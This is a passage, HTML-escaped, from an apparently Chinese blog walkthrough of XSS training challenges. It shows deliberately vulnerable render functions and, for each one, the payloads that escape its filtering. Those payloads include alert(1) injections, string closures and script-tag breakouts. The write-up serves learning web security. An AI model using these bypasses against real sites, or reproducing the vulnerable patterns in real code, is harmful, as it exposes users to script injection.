class&#x3D;&quot;line&quot;&gt;            .replace(&#x2F;&amp;#x27;&#x2F;g, &amp;#x27;&lt;span class&#x3D;&quot;symbol&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&amp;#x27;)&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;            .replace(&#x2F;&quot;&#x2F;g, &amp;#x27;&lt;span class&#x3D;&quot;symbol&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&amp;#x27;)&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;            .replace(&#x2F;&lt;&#x2F;g, &amp;#x27;&lt;span class&#x3D;&quot;symbol&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&amp;#x27;)&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;            .replace(&#x2F;&gt;&#x2F;g, &amp;#x27;&lt;span class&#x3D;&quot;symbol&quot;&gt;&amp;gt;&lt;&#x2F;span&gt;&amp;#x27;)&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;            .replace(&#x2F;\&#x2F;&#x2F;g, &amp;#x27;&lt;span class&#x3D;&quot;symbol&quot;&gt;&amp;#x2f;&lt;&#x2F;span&gt;&amp;#x27;)&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;  &amp;#125;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;  return &#96;&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&lt;span class&#x3D;&quot;name&quot;&gt;img&lt;&#x2F;span&gt; &lt;span class&#x3D;&quot;attr&quot;&gt;src&lt;&#x2F;span&gt; &lt;span class&#x3D;&quot;attr&quot;&gt;onerror&lt;&#x2F;span&gt;&#x3D;&lt;span class&#x3D;&quot;string&quot;&gt;&quot;console.error(&amp;#x27;$&amp;#123;escapeHtml(input)&amp;#125;&amp;#x27;)&quot;&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&#96;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&amp;#125;&lt;&#x2F;span&gt;&lt;br&gt;&lt;&#x2F;pre&gt;&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt;&lt;&#x2F;table&gt;&lt;&#x2F;figure&gt;

&lt;p&gt;&lt;img src&#x3D;&quot;&#x2F;.&#x2F;images&#x2F;20250621_1354399191.png&quot;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;对一些比符号进行了HTML实体编码，但是由于输入部分位于标签的属性中，转化了HTML实体后依然可以解析。&lt;&#x2F;p&gt;
&lt;h3 id&#x3D;&quot;Payload-13&quot;&gt;&lt;a href&#x3D;&quot;#Payload-13&quot; class&#x3D;&quot;headerlink&quot; title&#x3D;&quot;Payload&quot;&gt;&lt;&#x2F;a&gt;Payload&lt;&#x2F;h3&gt;&lt;figure class&#x3D;&quot;highlight xml&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class&#x3D;&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class&#x3D;&quot;line&quot;&gt;1&lt;&#x2F;span&gt;&lt;br&gt;&lt;&#x2F;pre&gt;&lt;&#x2F;td&gt;&lt;td class&#x3D;&quot;code&quot;&gt;&lt;pre&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&amp;#x27;);alert(1)&#x2F;&#x2F;&lt;&#x2F;span&gt;&lt;br&gt;&lt;&#x2F;pre&gt;&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt;&lt;&#x2F;table&gt;&lt;&#x2F;figure&gt;

&lt;figure class&#x3D;&quot;highlight xml&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class&#x3D;&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class&#x3D;&quot;line&quot;&gt;1&lt;&#x2F;span&gt;&lt;br&gt;&lt;&#x2F;pre&gt;&lt;&#x2F;td&gt;&lt;td class&#x3D;&quot;code&quot;&gt;&lt;pre&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&amp;#x27;);alert(&amp;#x27;XSS&lt;&#x2F;span&gt;&lt;br&gt;&lt;&#x2F;pre&gt;&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt;&lt;&#x2F;table&gt;&lt;&#x2F;figure&gt;

&lt;h2 id&#x3D;&quot;0x10-window&quot;&gt;&lt;a href&#x3D;&quot;#0x10-window&quot; class&#x3D;&quot;headerlink&quot; title&#x3D;&quot;0x10  window&quot;&gt;&lt;&#x2F;a&gt;0x10  window&lt;&#x2F;h2&gt;&lt;h3 id&#x3D;&quot;Server-Code-15&quot;&gt;&lt;a href&#x3D;&quot;#Server-Code-15&quot; class&#x3D;&quot;headerlink&quot; title&#x3D;&quot;Server Code&quot;&gt;&lt;&#x2F;a&gt;Server Code&lt;&#x2F;h3&gt;&lt;figure class&#x3D;&quot;highlight xml&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class&#x3D;&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class&#x3D;&quot;line&quot;&gt;1&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;2&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;3&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;4&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;5&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;6&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;7&lt;&#x2F;span&gt;&lt;br&gt;&lt;&#x2F;pre&gt;&lt;&#x2F;td&gt;&lt;td class&#x3D;&quot;code&quot;&gt;&lt;pre&gt;&lt;span class&#x3D;&quot;line&quot;&gt;function render (input) &amp;#123;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;  return &#96;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&lt;span class&#x3D;&quot;name&quot;&gt;script&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;span class&#x3D;&quot;language-javascript&quot;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;language-javascript&quot;&gt;  &lt;span class&#x3D;&quot;variable language_&quot;&gt;window&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;property&quot;&gt;data&lt;&#x2F;span&gt; &#x3D; $&amp;#123;input&amp;#125;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;language-javascript&quot;&gt;&lt;&#x2F;span&gt;&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&#x2F;&lt;span class&#x3D;&quot;name&quot;&gt;script&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;  &#96;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&amp;#125;&lt;&#x2F;span&gt;&lt;br&gt;&lt;&#x2F;pre&gt;&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt;&lt;&#x2F;table&gt;&lt;&#x2F;figure&gt;

&lt;p&gt;&lt;code&gt;&lt;font style&#x3D;&quot;color:rgba(0, 0, 0, 0.85);&quot;&gt;window&lt;&#x2F;font&gt;&lt;&#x2F;code&gt;&lt;font style&#x3D;&quot;color:rgba(0, 0, 0, 0.85);&quot;&gt; 是一个全局对象，在浏览器环境中代表浏览器窗口&lt;&#x2F;font&gt;&lt;&#x2F;p&gt;
&lt;h3 id&#x3D;&quot;Payload-14&quot;&gt;&lt;a href&#x3D;&quot;#Payload-14&quot; class&#x3D;&quot;headerlink&quot; title&#x3D;&quot;Payload&quot;&gt;&lt;&#x2F;a&gt;Payload&lt;&#x2F;h3&gt;&lt;figure class&#x3D;&quot;highlight xml&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class&#x3D;&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class&#x3D;&quot;line&quot;&gt;1&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;2&lt;&#x2F;span&gt;&lt;br&gt;&lt;&#x2F;pre&gt;&lt;&#x2F;td&gt;&lt;td class&#x3D;&quot;code&quot;&gt;&lt;pre&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&#x2F;&lt;span class&#x3D;&quot;name&quot;&gt;script&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&lt;span class&#x3D;&quot;name&quot;&gt;script&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;alert(1)&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&#x2F;&lt;span class&#x3D;&quot;name&quot;&gt;script&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&lt;span class&#x3D;&quot;name&quot;&gt;script&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;&#x2F;pre&gt;&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt;&lt;&#x2F;table&gt;&lt;&#x2F;figure&gt;

&lt;figure class&#x3D;&quot;highlight xml&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class&#x3D;&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class&#x3D;&quot;line&quot;&gt;1&lt;&#x2F;span&gt;&lt;br&gt;&lt;&#x2F;pre&gt;&lt;&#x2F;td&gt;&lt;td class&#x3D;&quot;code&quot;&gt;&lt;pre&gt;&lt;span class&#x3D;&quot;line&quot;&gt;alert(1)&lt;&#x2F;span&gt;&lt;br&gt;&lt;&#x2F;pre&gt;&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt;&lt;&#x2F;table&gt;&lt;&#x2F;figure&gt;

&lt;p&gt;&lt;img src&#x3D;&quot;&#x2F;.&#x2F;images&#x2F;20250621_1354392941.png&quot;&gt;&lt;&#x2F;p&gt;
&lt;h2 id&#x3D;&quot;0x11&quot;&gt;&lt;a href&#x3D;&quot;#0x11&quot; class&#x3D;&quot;headerlink&quot; title&#x3D;&quot;0x11&quot;&gt;&lt;&#x2F;a&gt;0x11&lt;&#x2F;h2&gt;&lt;h3 id&#x3D;&quot;Server-Code-16&quot;&gt;&lt;a href&#x3D;&quot;#Server-Code-16&quot; class&#x3D;&quot;headerlink&quot; title&#x3D;&quot;Server Code&quot;&gt;&lt;&#x2F;a&gt;Server Code&lt;&#x2F;h3&gt;&lt;figure class&#x3D;&quot;highlight xml&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class&#x3D;&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class&#x3D;&quot;line&quot;&gt;1&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;2&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;3&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;4&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;5&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;6&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;7&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;8&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;9&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;10&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;11&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;12&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;13&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;14&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;15&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;16&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;17&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;18&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;19&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;20&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;21&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;22&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;23&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;24&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;25&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;26&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;27&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;28&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;29&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;30&lt;&#x2F;span&gt;&lt;br&gt;&lt;&#x2F;pre&gt;&lt;&#x2F;td&gt;&lt;td class&#x3D;&quot;code&quot;&gt;&lt;pre&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&#x2F;&#x2F; from alf.nu&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;function render (s) &amp;#123;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;  function escapeJs (s) &amp;#123;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;    return String(s)&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;            .replace(&#x2F;\\&#x2F;g, &amp;#x27;\\\\&amp;#x27;)&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;            .replace(&#x2F;&amp;#x27;&#x2F;g, &amp;#x27;\\\&amp;#x27;&amp;#x27;)&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;            .replace(&#x2F;&quot;&#x2F;g, &amp;#x27;\\&quot;&amp;#x27;)&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;            .replace(&#x2F;&#96;&#x2F;g, &amp;#x27;\\&#96;&amp;#x27;)&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;            .replace(&#x2F;&lt;&#x2F;g, &amp;#x27;\\74&amp;#x27;)&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;            .replace(&#x2F;&gt;&#x2F;g, &amp;#x27;\\76&amp;#x27;)&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;            .replace(&#x2F;\&#x2F;&#x2F;g, &amp;#x27;\\&#x2F;&amp;#x27;)&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;            .replace(&#x2F;\n&#x2F;g, &amp;#x27;\\n&amp;#x27;)&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;            .replace(&#x2F;\r&#x2F;g, &amp;#x27;\\r&amp;#x27;)&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;            .replace(&#x2F;\t&#x2F;g, &amp;#x27;\\t&amp;#x27;)&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;            .replace(&#x2F;\f&#x2F;g, &amp;#x27;\\f&amp;#x27;)&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;            .replace(&#x2F;\v&#x2F;g, &amp;#x27;\\v&amp;#x27;)&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;            &#x2F;&#x2F; .replace(&#x2F;\b&#x2F;g, &amp;#x27;\\b&amp;#x27;)&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;            .replace(&#x2F;\0&#x2F;g, &amp;#x27;\\0&amp;#x27;)&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;  &amp;#125;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;  s &#x3D; escapeJs(s)&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;  return &#96;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&lt;span class&#x3D;&quot;name&quot;&gt;script&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;span class&#x3D;&quot;language-javascript&quot;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;language-javascript&quot;&gt;  &lt;span class&#x3D;&quot;keyword&quot;&gt;var&lt;&#x2F;span&gt; url &#x3D; &lt;span class&#x3D;&quot;string&quot;&gt;&amp;#x27;javascript:console.log(&quot;$&amp;#123;s&amp;#125;&quot;)&amp;#x27;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;language-javascript&quot;&gt;  &lt;span class&#x3D;&quot;keyword&quot;&gt;var&lt;&#x2F;span&gt; a &#x3D; &lt;span class&#x3D;&quot;variable language_&quot;&gt;document&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;title function_&quot;&gt;createElement&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;string&quot;&gt;&amp;#x27;a&amp;#x27;&lt;&#x2F;span&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;language-javascript&quot;&gt;  a.&lt;span class&#x3D;&quot;property&quot;&gt;href&lt;&#x2F;span&gt; &#x3D; url&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;language-javascript&quot;&gt;  &lt;span class&#x3D;&quot;variable language_&quot;&gt;document&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;property&quot;&gt;body&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;title function_&quot;&gt;appendChild&lt;&#x2F;span&gt;(a)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;language-javascript&quot;&gt;  a.&lt;span class&#x3D;&quot;title function_&quot;&gt;click&lt;&#x2F;span&gt;()&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;language-javascript&quot;&gt;&lt;&#x2F;span&gt;&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&#x2F;&lt;span class&#x3D;&quot;name&quot;&gt;script&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&#96;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&amp;#125;&lt;&#x2F;span&gt;&lt;br&gt;&lt;&#x2F;pre&gt;&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt;&lt;&#x2F;table&gt;&lt;&#x2F;figure&gt;

&lt;p&gt;就简单的闭合就可以了&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src&#x3D;&quot;&#x2F;.&#x2F;images&#x2F;20250621_1354393661.png&quot;&gt;&lt;&#x2F;p&gt;
&lt;h3 id&#x3D;&quot;Payload-15&quot;&gt;&lt;a href&#x3D;&quot;#Payload-15&quot; class&#x3D;&quot;headerlink&quot; title&#x3D;&quot;Payload&quot;&gt;&lt;&#x2F;a&gt;Payload&lt;&#x2F;h3&gt;&lt;figure class&#x3D;&quot;highlight xml&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class&#x3D;&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class&#x3D;&quot;line&quot;&gt;1&lt;&#x2F;span&gt;&lt;br&gt;&lt;&#x2F;pre&gt;&lt;&#x2F;td&gt;&lt;td class&#x3D;&quot;code&quot;&gt;&lt;pre&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&quot;);alert(3)(&quot;&lt;&#x2F;span&gt;&lt;br&gt;&lt;&#x2F;pre&gt;&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt;&lt;&#x2F;table&gt;&lt;&#x2F;figure&gt;

&lt;h2 id&#x3D;&quot;0x12&quot;&gt;&lt;a href&#x3D;&quot;#0x12&quot; class&#x3D;&quot;headerlink&quot; title&#x3D;&quot;0x12&quot;&gt;&lt;&#x2F;a&gt;0x12&lt;&#x2F;h2&gt;&lt;h3 id&#x3D;&quot;Server-Code-17&quot;&gt;&lt;a href&#x3D;&quot;#Server-Code-17&quot; class&#x3D;&quot;headerlink&quot; title&#x3D;&quot;Server Code&quot;&gt;&lt;&#x2F;a&gt;Server Code&lt;&#x2F;h3&gt;&lt;figure class&#x3D;&quot;highlight xml&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class&#x3D;&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class&#x3D;&quot;line&quot;&gt;1&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;2&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;3&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;4&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;5&lt;&#x2F;span&gt;&lt;br&gt;&lt;&#x2F;pre&gt;&lt;&#x2F;td&gt;&lt;td class&#x3D;&quot;code&quot;&gt;&lt;pre&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&#x2F;&#x2F; from alf.nu&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;function escape (s) &amp;#123;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;  s &#x3D; s.replace(&#x2F;&quot;&#x2F;g, &amp;#x27;\\&quot;&amp;#x27;)&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;  return &amp;#x27;&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&lt;span class&#x3D;&quot;name&quot;&gt;script&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;span class&#x3D;&quot;language-javascript&quot;&gt;&lt;span class&#x3D;&quot;variable language_&quot;&gt;console&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;title function_&quot;&gt;log&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;string&quot;&gt;&quot;&amp;#x27; + s + &amp;#x27;&quot;&lt;&#x2F;span&gt;);&lt;&#x2F;span&gt;&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&#x2F;&lt;span class&#x3D;&quot;name&quot;&gt;script&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&amp;#x27;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&amp;#125;&lt;&#x2F;span&gt;&lt;br&gt;&lt;&#x2F;pre&gt;&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt;&lt;&#x2F;table&gt;&lt;&#x2F;figure&gt;

&lt;p&gt;就简单转义了一个&quot;符号，刚好可以用来闭合console.log&lt;&#x2F;p&gt;
&lt;p&gt;然后构建payload闭合下面的&lt;script&gt;即可&lt;&#x2F;p&gt;
&lt;h3 id&#x3D;&quot;Payload-16&quot;&gt;&lt;a href&#x3D;&quot;#Payload-16&quot; class&#x3D;&quot;headerlink&quot; title&#x3D;&quot;Payload&quot;&gt;&lt;&#x2F;a&gt;Payload&lt;&#x2F;h3&gt;&lt;figure class&#x3D;&quot;highlight xml&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class&#x3D;&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class&#x3D;&quot;line&quot;&gt;1&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;2&lt;&#x2F;span&gt;&lt;br&gt;&lt;&#x2F;pre&gt;&lt;&#x2F;td&gt;&lt;td class&#x3D;&quot;code&quot;&gt;&lt;pre&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&quot;)&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&#x2F;&lt;span class&#x3D;&quot;name&quot;&gt;script&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&lt;span class&#x3D;&quot;name&quot;&gt;script&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;span class&#x3D;&quot;language-javascript&quot;&gt;&lt;span class&#x3D;&quot;title function_&quot;&gt;alert&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;number&quot;&gt;1&lt;&#x2F;span&gt;)&lt;span class&#x3D;&quot;comment&quot;&gt;&#x2F;&#x2F;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;&#x2F;pre&gt;&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt;&lt;&#x2F;table&gt;&lt;&#x2F;figure&gt;

&lt;p&gt;&lt;img src&#x3D;&quot;&#x2F;.&#x2F;images&#x2F;20250621_1354395873.png&quot;&gt;&lt;&#x2F;p&gt;
&lt;h1 id&#x3D;&quot;参考文章&quot;&gt;&lt;a href&#x3D;&quot;#参考文章&quot; class&#x3D;&quot;headerlink&quot; title&#x3D;&quot;参考文章&quot;&gt;&lt;&#x2F;a&gt;参考文章&lt;&#x2F;h1&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th align&#x3D;&quot;center&quot;&gt;&lt;font style&#x3D;&quot;color:rgb(34, 34, 34);&quot;&gt;名称&lt;&#x2F;font&gt;&lt;&#x2F;th&gt;
&lt;th align&#x3D;&quot;center&quot;&gt;&lt;font style&#x3D;&quot;color:rgb(34, 34, 34);&quot;&gt;地址&lt;&#x2F;font&gt;&lt;&#x2F;th&gt;
&lt;&#x2F;tr&gt;
&lt;&#x2F;thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td align&#x3D;&quot;center&quot;&gt;&lt;font style&#x3D;&quot;color:rgb(34, 34, 34);&quot;&gt;理解浏览器解析规则文章&lt;&#x2F;font&gt;&lt;&#x2F;td&gt;
&lt;td align&#x3D;&quot;center&quot;&gt;&lt;a href&#x3D;&quot;http:&#x2F;&#x2F;bobao.360.cn&#x2F;learning&#x2F;detail&#x2F;292.html&quot;&gt;&lt;font style&#x3D;&quot;color:rgb(92, 142, 198);&quot;&gt;http:&#x2F;&#x2F;bobao.360.cn&#x2F;learning&#x2F;detail&#x2F;292.html&lt;&#x2F;font&gt;&lt;&#x2F;a&gt;&lt;&#x2F;td&gt;
&lt;&#x2F;tr&gt;
&lt;tr&gt;
&lt;td align&#x3D;&quot;center&quot;&gt;&lt;font style&#x3D;&quot;color:rgb(34, 34, 34);&quot;&gt;XSS编码剖析&lt;&#x2F;font&gt;&lt;&#x2F;td&gt;
&lt;td align&#x3D;&quot;center&quot;&gt;&lt;a href&#x3D;&quot;https:&#x2F;&#x2F;www.freebuf.com&#x2F;articles&#x2F;web&#x2F;43285.html&quot;&gt;&lt;font style&#x3D;&quot;color:rgb(92, 142, 198);&quot;&gt;https:&#x2F;&#x2F;www.freebuf.com&#x2F;articles&#x2F;web&#x2F;43285.html&lt;&#x2F;font&gt;&lt;&#x2F;a&gt;&lt;&#x2F;td&gt;
&lt;&#x2F;tr&gt;
&lt;tr&gt;
